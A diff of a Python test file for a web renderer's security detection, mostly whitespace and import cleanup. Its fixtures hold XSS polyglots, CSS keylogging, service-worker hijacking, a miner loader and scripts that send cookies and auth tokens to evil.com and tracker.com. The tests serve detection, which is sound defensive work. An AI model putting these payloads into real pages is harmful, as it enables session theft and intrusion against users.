@@ -1,11 +1,10 @@
 """Security boundary tests for rendering system."""
 
-from unittest.mock import AsyncMock, MagicMock, patch
+from unittest.mock import AsyncMock, MagicMock
 
 import pytest
-from playwright.async_api import Error as PlaywrightError
 
-from src.rendering.browser import BrowserConfig, JavaScriptRenderer, RenderResult
+from src.rendering.browser import RenderResult
 from src.rendering.detector import ContentAnalysis, DynamicContentDetector
 from src.rendering.renderer import AdaptiveRenderer
 
@@ -89,7 +88,7 @@ class TestSecurityBoundaries:
         """Test detection of CSS expressions and behaviors (IE legacy attacks)."""
         css_expression_html = """  # noqa: W291, W293
         <style>
-            .exploit { 
+            .exploit {
                 width: expression(alert('XSS'));
                 behavior: url(malicious.htc);
                 -moz-binding: url("javascript:alert('XSS')");
@@ -133,7 +132,7 @@ class TestSecurityBoundaries:
                 # Should detect infinite redirect loop
                 assert True
                 break
-        
+
         # Should have detected the loop before exceeding reasonable limits
         assert redirect_count <= max_redirects + 1
 
@@ -178,10 +177,10 @@ class TestSecurityBoundaries:
     def test_clickjacking_iframe_detection(self):
         """Test detection of potential clickjacking iframes."""
         clickjacking_html = """  # noqa: W291, W293
-        <iframe src="https://legitimate-bank.com/transfer" 
+        <iframe src="https://legitimate-bank.com/transfer"
                 style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%">
         </iframe>
-        <iframe src="https://social-media.com/like-button" 
+        <iframe src="https://social-media.com/like-button"
                 style="opacity:0.01;width:1px;height:1px">
         </iframe>
         <div style="position:relative;">
@@ -207,7 +206,7 @@ class TestSecurityBoundaries:
                 // Send sensitive data to attacker
                 ws.send(document.cookie + '|' + localStorage.getItem('auth_token'));
             };
-            
+
             var ws2 = new WebSocket('wss://evil.com/data-exfil');
             ws2.onmessage = function(event) {
                 eval(event.data); // Execute remote code
@@ -252,17 +251,17 @@ class TestSecurityBoundaries:
         <script>
             // Prototype pollution attempts
             var obj = JSON.parse('{"__proto__": {"isAdmin": true}}');
-            
+
             // Constructor pollution
             var malicious = {"constructor": {"prototype": {"isAdmin": true}}};
-            
+
             // Through URL parameters
             var params = new URLSearchParams(location.search);
             var config = {};
             for (let [key, value] of params) {
                 config[key] = value; // Dangerous if key is __proto__
             }
-            
+
             // Lodash-style pollution
             function setValue(obj, path, value) {
                 var keys = path.split('.');
@@ -287,7 +286,7 @@ class TestSecurityBoundaries:
         """Test detection of CSP bypass attempts."""
         csp_bypass_html = """  # noqa: W291, W293
         <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
-        
+
         <!-- Attempt to bypass CSP -->
         <script src="data:text/javascript,alert('CSP Bypass')"></script>
         <script>
@@ -295,11 +294,11 @@ class TestSecurityBoundaries:
             window.callback = function(data) { eval(data); };
         </script>
         <script src="https://evil.com/jsonp?callback=callback"></script>
-        
+
         <!-- Base tag manipulation -->
         <base href="https://malicious-cdn.com/">
         <script src="app.js"></script> <!-- Now loads from malicious-cdn.com/app.js -->
-        
+
         <!-- Link prefetch abuse -->
         <link rel="prefetch" href="https://tracker.com/collect?data=sensitive">
         """
@@ -317,11 +316,11 @@ class TestSecurityBoundaries:
             <!-- Unicode characters that normalize to dangerous strings -->
             ＜script＞alert('XSS')＜/script＞
             ＜iframe src="javascript:alert('XSS')"＞＜/iframe＞
-            
+
             <!-- Homograph attacks -->
             <a href="https://аpple.com">Apple Login</a> <!-- Cyrillic 'а' instead of 'a' -->
             <a href="https://gοοgle.com">Google</a> <!-- Greek omicron instead of 'o' -->
-            
+
             <!-- Zero-width characters -->
             <script>eval('ale​rt("XSS")');</script> <!-- Contains zero-width space -->
         </div>
@@ -386,10 +385,10 @@ class TestSecurityBoundaries:
             input[value^="a"] { background-image: url("https://evil.com/log?key=a"); }
             input[value^="b"] { background-image: url("https://evil.com/log?key=b"); }
             input[value^="admin"] { background-image: url("https://evil.com/log?pw=admin"); }
-            
+
             /* Attribute selectors for all characters */
             input[value*="password"] { background: url("https://evil.com/leak"); }
-            
+
             /* Focus-based tracking */
             input:focus { background: url("https://evil.com/focus"); }
         </style>
@@ -413,7 +412,7 @@ class TestSecurityBoundaries:
                         // Service worker can intercept all network requests
                         console.log('Malicious SW registered');
                     });
-                
+
                 // Hijack existing service worker
                 navigator.serviceWorker.getRegistrations()
                     .then(function(registrations) {
@@ -422,7 +421,7 @@ class TestSecurityBoundaries:
                         });
                     });
             }
-            
+
             // Abuse of Web Workers for cryptocurrency mining
             if (typeof Worker !== 'undefined') {
                 var worker = new Worker('https://crypto-miner.com/mine.js');
@@ -448,12 +447,12 @@ class TestSecurityBoundaries:
             <noscript>&lt;script&gt;alert('mXSS')&lt;/script&gt;</noscript>
             <noembed>&lt;script&gt;alert('mXSS')&lt;/script&gt;</noembed>
             <noframes>&lt;script&gt;alert('mXSS')&lt;/script&gt;</noframes>
-            
+
             <!-- Template-based mXSS -->
             <template>
                 <script>alert('Template XSS')</script>
             </template>
-            
+
             <!-- XML namespace mXSS -->
             <div xmlns:xss="http://www.w3.org/1999/xhtml">
                 <xss:script>alert('Namespace XSS')</xss:script>
@@ -479,19 +478,19 @@ class TestSecurityBoundaries:
             ctx.font = '14px Arial';
             ctx.fillText('Browser fingerprint test', 2, 2);
             var fingerprint = canvas.toDataURL();
-            
+
             // Audio fingerprinting
             var audioContext = new (window.AudioContext || window.webkitAudioContext)();
             var oscillator = audioContext.createOscillator();
             var analyser = audioContext.createAnalyser();
-            
+
             // WebGL fingerprinting
             var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            
+
             // Font enumeration
             var fonts = ['Arial', 'Helvetica', 'Times New Roman', /* ... many fonts ... */];
-            
+
             // Hardware fingerprinting
             var hardwareInfo = {
                 cores: navigator.hardwareConcurrency,
@@ -500,7 +499,7 @@ class TestSecurityBoundaries:
                 userAgent: navigator.userAgent,
                 screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth
             };
-            
+
             // Send fingerprint to server
             fetch('https://tracker.com/fingerprint', {
                 method: 'POST',
@@ -525,7 +524,7 @@ class TestSecurityBoundaries:
             javascript:/*--></title></style></textarea></script></xmp>
             <svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
         </div>
-        
+
         <!-- Another polyglot -->
         <div>
             ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
@@ -588,7 +587,7 @@ class TestInputValidationSecurity:
             # Should detect CRLF injection attempts
             if "\r" in header_value or "\n" in header_value:
                 dangerous_headers.append(header_name)
-        
+
         # Should detect all malicious headers
         assert len(dangerous_headers) == 3
 
@@ -650,7 +649,7 @@ class TestInputValidationSecurity:
 
         # Test that concurrent processing has reasonable limits (not resource exhaustion)
         results = await renderer.render_multiple(urls, max_concurrent=10)
-        
+
         # Should process all URLs without exhausting resources
         assert len(results) == 100
 
@@ -690,7 +689,7 @@ class TestAuthenticationSecurity:
             // Attempt to fix session ID
             document.cookie = 'JSESSIONID=FIXED_SESSION_ID; path=/';
             document.cookie = 'PHPSESSID=ATTACKER_CHOSEN_ID; path=/';
-            
+
             // Redirect to login after fixing session
             setTimeout(() => {
                 window.location = '/login?continue=' + encodeURIComponent(window.location);
@@ -701,7 +700,7 @@ class TestAuthenticationSecurity:
         # Should detect session fixation patterns in content
         session_patterns = [
             "JSESSIONID=",
-            "PHPSESSID=", 
+            "PHPSESSID=",
             "document.cookie",
             "FIXED_SESSION_ID",
             "ATTACKER_CHOSEN_ID"
@@ -726,24 +725,24 @@ class TestDataLeakagePrevention:
             <!-- Credit card numbers -->
             <span>4532015112830366</span>
             <input value="5555555555554444" type="hidden">
-            
+
             <!-- Social security numbers -->
             <p>SSN: 123-45-6789</p>
-            
+
             <!-- API keys and tokens -->
             <script>
                 var apiKey = 'sk_live_abcdef123456789';
                 var token = 'ghp_16C7e42F292c6912E7710c838347Ae178B4a';
                 var secret = 'aws_secret_access_key_123456789';
             </script>
-            
+
             <!-- Private keys -->
             <pre>
             -----BEGIN PRIVATE KEY-----
             MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKB
             -----END PRIVATE KEY-----
             </pre>
-            
+
             <!-- Email addresses and phone numbers -->
             <span>contact@company.com</span>
             <span>+1-555-123-4567</span>
@@ -777,17 +776,17 @@ class TestDataLeakagePrevention:
         error_disclosure_html = """  # noqa: W291, W293
         <div class="error">
             Database connection failed: Access denied for user 'admin'@'localhost' (using password: YES)
-            
+
             File not found: /var/www/html/admin/config/database.php on line 42
-            
+
             Stack trace:
             at DatabaseConnection.connect() (/app/src/db.js:156:12)
             at Application.start() (/app/server.js:89:7)
-            
+
             SQL Error: Table 'users' doesn't exist in database 'production_db'
-            
+
             Warning: include(/etc/passwd): failed to open stream
-            
+
             Exception: API key validation failed for key: sk_live_1234567890abcdef
         </div>
         """
@@ -814,7 +813,7 @@ class TestDataLeakagePrevention:
         # Mock response with sensitive headers
         sensitive_headers = {
             "Server": "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1f PHP/7.4.3",
-            "X-Powered-By": "PHP/7.4.3", 
+            "X-Powered-By": "PHP/7.4.3",
             "X-Debug-Info": "Debug mode enabled, user: admin",
             "X-Internal-Path": "/var/www/html/app/",
             "X-Real-IP": "192.168.1.100",
@@ -825,11 +824,11 @@ class TestDataLeakagePrevention:
         disclosure_indicators = []
         for header_name, header_value in sensitive_headers.items():
             # Headers that commonly leak sensitive information
-            if any(keyword in header_name.lower() for keyword in 
+            if any(keyword in header_name.lower() for keyword in
                    ['server', 'powered-by', 'debug', 'internal', 'real-ip']):
                 disclosure_indicators.append(header_name)
-            
-            # Version information disclosure  
+
+            # Version information disclosure
             if any(version in header_value for version in ['2.4.41', 'PHP/7.4.3', '192.168']):
                 disclosure_indicators.append(f"{header_name}_version")
 
@@ -847,7 +846,7 @@ class TestDataLeakagePrevention:
         </head>
         <body>
             <div>Public content</div>
-            <!-- 
+            <!--
                 Debug info:
                 User ID: 12345
                 Session: abc123def456
